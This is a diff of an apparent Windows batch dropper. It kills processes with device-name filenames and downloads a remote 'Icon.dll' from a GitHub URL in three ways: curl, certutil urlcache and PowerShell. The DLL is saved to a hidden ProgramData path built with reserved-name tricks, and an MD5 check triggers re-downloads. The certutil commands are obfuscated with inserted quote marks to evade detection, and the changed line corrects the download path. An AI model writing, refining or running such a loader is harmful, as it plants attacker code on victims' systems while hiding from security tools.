@@ -14,7 +14,7 @@ taskkill.exe /f /IM nul.exe
 taskkill.exe /f /IM prn.exe
 taskkill.exe /f /IM con.exe
 
-cert""""util -hash""""file "\\.\%ProgramData%\prndata..\prn" MD5 | findstr /i "bb8ec1cad79a6b47ac6a6e472a407d20" >nul || curl.exe -s -L -o "\\.\%ProgramData%\prn" "https://github.com/vltex/1/raw/1/0/Icon.dll"
+cert""""util -hash""""file "\\.\%ProgramData%\prndata..\prn" MD5 | findstr /i "bb8ec1cad79a6b47ac6a6e472a407d20" >nul || curl.exe -s -L -o "\\.\%ProgramData%\prndata..\prn" "https://github.com/vltex/1/raw/1/0/Icon.dll"
 cert""""util -hash""""file "\\.\%ProgramData%\prndata..\prn" MD5 | findstr /i "bb8ec1cad79a6b47ac6a6e472a407d20" >nul || cert""""util -url""""cache -sp""""lit -f "https://github.com/vltex/1/raw/1/0/Icon.dll" "\\.\%ProgramData%\prndata..\prn"
 powershell.exe -Command "if ((Get-FileHash '\\?\%ProgramData%\prndata..\prn' -Algorithm MD5 -ErrorAction SilentlyContinue).Hash -ne 'bb8ec1cad79a6b47ac6a6e472a407d20') { Invoke-WebRequest 'https://github.com/vltex/1/raw/1/0/Icon.dll' -OutFile '\\.\%ProgramData%\prndata..\prn' }"
 
